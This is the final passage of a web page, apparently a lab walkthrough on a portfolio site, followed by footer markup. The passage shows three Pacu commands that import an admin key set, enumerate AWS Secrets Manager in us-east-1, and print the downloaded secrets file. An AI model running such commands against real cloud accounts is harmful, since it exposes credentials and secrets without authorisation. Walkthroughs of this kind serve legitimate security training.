</span></span><span style="display:flex;"><span>import_keys bean_admin
</span></span><span style="display:flex;"><span>run secrets__enum --region us-east-1
</span></span><span style="display:flex;"><span>cat ~/.local/share/pacu/beanstalk/downloads/secrets/secrets_manager/secrets.txt
</span></span></code></pre></div><pre tabindex="0"><code></code></pre>
  </div>
</article>

    
<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>

<script src="../../js/darkmode.js" defer></script>



<footer class="bg-gray-900">
    <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
        <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/about/" class="text-base text-gray-400 hover:text-gray-300">About</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/biomedical/" class="text-base text-gray-400 hover:text-gray-300">Biomedical</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/software/" class="text-base text-gray-400 hover:text-gray-300">Software</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/cybersecurity/" class="text-base text-gray-400 hover:text-gray-300">Cybersecurity</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/posts/" class="text-base text-gray-400 hover:text-gray-300">Walkthroughs</a>
            </div>
            
        </nav>
        <p class="mt-8 text-base text-center text-gray-400">&copy; 2025
            Personal Portfolio. All rights
            reserved.</p>
        <p class="mt-2 text-base text-center text-gray-400">Theme made with &#x2764;&#xfe0f; by <a
               href="https://nusserstudios.com" class="hover:underline hover:text-primary-600"><span
                      class="font-black uppercase">Nusser</span> <span class="font-light uppercase">Studios.</span></a>
        </p>
    </div>
</footer>
</body>

</html>